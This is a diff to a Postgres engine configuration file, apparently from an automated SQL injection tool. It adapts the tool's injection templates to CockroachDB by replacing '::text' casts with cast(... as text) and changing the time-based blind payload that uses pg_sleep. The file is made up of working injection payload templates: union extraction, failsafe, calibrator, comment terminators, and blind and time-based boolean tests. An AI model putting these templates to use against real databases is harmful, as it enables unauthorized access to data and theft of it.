@@ -1,4 +1,5 @@
 engine: Postgres
+# need cast(as text) instead of ::text for cockroachdb
 
 resource:
  info: |
@@ -24,7 +25,7 @@ resource:
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
-                   || q::text
+                   || cast(q as text)
                    || '${enclose_value_sql}'
                from (
                    select
@@ -47,7 +48,7 @@ resource:
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
-                   || q::text
+                   || cast(q as text)
                    || '${enclose_value_sql}'
                from (
                    select
@@ -70,7 +71,7 @@ resource:
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
-                   || q::text
+                   || cast(q as text)
                    || '${enclose_value_sql}'
                from (
                    select
@@ -95,7 +96,7 @@ resource:
                     '${enclose_value_sql}'
                     || r
                     || '${separator_qte_sql}'
-                    || q::text
+                    || cast(q as text)
                     || '${enclose_value_sql}'
                 from (
                     select
@@ -109,7 +110,7 @@ resource:
             '${separator_cell_sql}'
         )
    fields:
-    field: trim(coalesce(${field.value}::text, ''))
+    field: trim(coalesce(cast(${field.value} as text), ''))
     concat: "|| '%7f' ||"
 
  exploit: |
@@ -216,7 +217,7 @@ strategy:
        )
        || '${trail_sql}'
   limit: limit 65536 offset ${limit.value}
-  failsafe: (1337${indice}7330%2b1)::text
+  failsafe: cast((1337${indice}7330%2b1)as text)
   calibrator: repeat('${calibrator_sql}', 1024)
   limitBoundary: 0
   endingComment: --+-
@@ -232,7 +233,6 @@ strategy:
     - "Query failed: ERROR:  unterminated quoted string at or near"
     - function\\.pg
     - cratedb
-    - cockroachdb
     - enterprisedb
     - greenplum
     - opengauss
@@ -302,12 +302,13 @@ strategy:
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
+  # need bool instead of '' in case/when for cockroachdb
   time: |
    ${binary.mode} ''=''
    || (
        select
            case when ${test}
-           then ''
+           then true
            else pg_sleep(${sleep_time})
        end
    )
